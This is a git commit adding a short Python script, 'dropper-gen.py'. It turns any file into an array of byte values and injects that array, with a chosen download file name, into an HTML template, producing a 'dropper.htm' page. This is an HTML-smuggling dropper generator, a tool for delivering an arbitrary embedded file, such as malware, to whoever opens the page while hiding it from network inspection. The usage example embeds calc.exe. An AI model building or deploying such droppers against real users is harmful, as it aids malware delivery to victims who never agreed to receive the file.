1a877c9a072dc93c2b4617cf060a8c1dcbc960b9
Cheka <39255806+Argentix03@users.noreply.github.com>
2021-12-26 21:35:18 +0200

    Add files via upload

---
+++ dropper-gen.py
@@ -0,0 +1,28 @@
+import sys
+template = "template.htm"
+data_location = 65
+file_name_location = 373
+if (len(sys.argv) != 3):
+    print("Usage: dropper.py <file to embed> <file name for download>")
+    print("Example:  python main.py C:\Windows\System32\calc.exe calc.exe")
+    exit()
+
+with open(sys.argv[1], "rb") as infile:
+    file_data = ""
+    byte = infile.read(1)
+    while byte != b'':
+        file_data += str(int.from_bytes(byte, "little")) + ","
+        byte = infile.read(1)
+
+    with open(template, "r") as tempfile:
+        with open("dropper.htm", "w") as outfile:
+            outfile.writelines(tempfile.readlines())
+        with open("dropper.htm", "r+") as outfile:
+            dropper = outfile.readlines()
+            for index, line in enumerate(dropper):
+                if "baiits = []" in line:
+                    dropper.insert(index + 1, "baiits = [" + file_data + "];\n")
+                elif "fileNameToSaveAs = \"\"" in line:
+                    dropper.insert(index + 1, "fileNameToSaveAs = \"" + sys.argv[2] + "\";\n")
+            outfile.seek(0)
+            outfile.writelines(dropper)
